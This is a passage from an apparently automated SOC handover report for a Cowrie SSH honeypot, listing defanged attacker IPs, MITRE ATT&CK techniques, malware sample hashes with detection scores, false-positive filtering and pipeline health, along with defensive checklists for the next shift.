| `2026-03-29 10:12:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.58.141[.]226` to AbuseIPDB if not already reported
- [ ] Block `122.58.141[.]226` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `123.156.230[.]101` | **4** | 2026-03-29 08:37 | 2026-03-29 09:42 | 8m | 0 | `T1592` | 🟢 LOW |
| `49.88.156[.]34` | **3** | 2026-03-29 10:03 | 2026-03-29 10:05 | 4m | 0 | `T1592` | 🟢 LOW |
| `103.63.25[.]171` | 1 | 2026-03-29 09:55 | 2026-03-29 09:55 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `116.153.81[.]58` | 1 | 2026-03-29 09:57 | 2026-03-29 09:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `116.232.19[.]229` | 1 | 2026-03-29 08:44 | 2026-03-29 08:44 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.11[.]36` | 1 | 2026-03-29 08:38 | 2026-03-29 08:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.52[.]58` | 1 | 2026-03-29 09:17 | 2026-03-29 09:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `166.1.144[.]62` | 1 | 2026-03-29 09:17 | 2026-03-29 09:17 | 8s | 1 | `T1110.001` | 🟢 LOW |
| `183.196.144[.]45` | 1 | 2026-03-29 09:32 | 2026-03-29 09:33 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.233.85[.]194` | 1 | 2026-03-29 09:59 | 2026-03-29 09:59 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.237.33[.]162` | 1 | 2026-03-29 09:26 | 2026-03-29 09:26 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.239.20[.]236` | 1 | 2026-03-29 10:30 | 2026-03-29 10:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.255.212[.]178` | 1 | 2026-03-29 09:45 | 2026-03-29 09:45 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `188.190.101[.]71` | 1 | 2026-03-29 09:32 | 2026-03-29 09:34 | 120s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `194.88.204[.]44` | 1 | 2026-03-29 09:39 | 2026-03-29 09:39 | 30s | 0 | `T1592` | 🟢 LOW |
| `196.189.126[.]10` | 1 | 2026-03-29 09:06 | 2026-03-29 09:06 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `202.84.34[.]85` | 1 | 2026-03-29 08:46 | 2026-03-29 08:47 | 35s | 0 | `T1592` | 🟢 LOW |
| `218.237.71[.]112` | 1 | 2026-03-29 10:12 | 2026-03-29 10:12 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `220.180.166[.]214` | 1 | 2026-03-29 09:59 | 2026-03-29 09:59 | 12s | 0 | `T1592` | 🟢 LOW |
| `24.237.119[.]118` | 1 | 2026-03-29 10:05 | 2026-03-29 10:05 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `31.173.66[.]222` | 1 | 2026-03-29 10:18 | 2026-03-29 10:18 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.120.216[.]232` | 1 | 2026-03-29 10:07 | 2026-03-29 10:07 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.152[.]225` | 1 | 2026-03-29 09:13 | 2026-03-29 09:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.106.78[.]215` | 1 | 2026-03-29 09:13 | 2026-03-29 09:13 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `8.154.0[.]104` | 1 | 2026-03-29 09:20 | 2026-03-29 09:20 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `8.211.154[.]253` | 1 | 2026-03-29 10:30 | 2026-03-29 10:30 | 8s | 0 | `T1592` | 🟢 LOW |
| `83.226.56[.]106` | 1 | 2026-03-29 09:40 | 2026-03-29 09:40 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `97.113.167[.]222` | 1 | 2026-03-29 09:03 | 2026-03-29 09:03 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `202.84.34[.]85` | BD | Internet Service Provider | **100** ⚠️ | 50 |
| `166.1.144[.]62` | DE | InterLIR LLC | **100** ⚠️ | 18 |
| `196.189.126[.]10` | ET | Ethio Telecom | **100** ⚠️ | 42 |
| `49.124.152[.]225` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 15 |
| `97.113.167[.]222` | US | CenturyLink Communications, LLC | **100** ⚠️ | 2 |
| `183.196.144[.]45` | CN | China Mobile Communications Corporation | **100** ⚠️ | 31 |
| `8.211.154[.]253` | JP | Alibaba Cloud (Singapore) Private Limited | **100** ⚠️ | 10 |
| `183.233.85[.]194` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `218.237.71[.]112` | KR | SK Broadband Co Ltd | **100** ⚠️ | 32 |
| `77.106.78[.]215` | RU | CJSC ER-Telecom Holding Barnaul branch | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 38 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 17 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 13 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 4 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 4 |

---

## 🔕 False Positive Summary (22 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 2 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 18 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 68 cases |
| Tool 34  | Credential Extractor        | ✅ 30 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 40 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 22 filtered (32.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 33 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 13 priority case(s) shown individually · 28 recon entry/entries in table (2 group(s) consolidating 7 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-29T10:31:13Z_
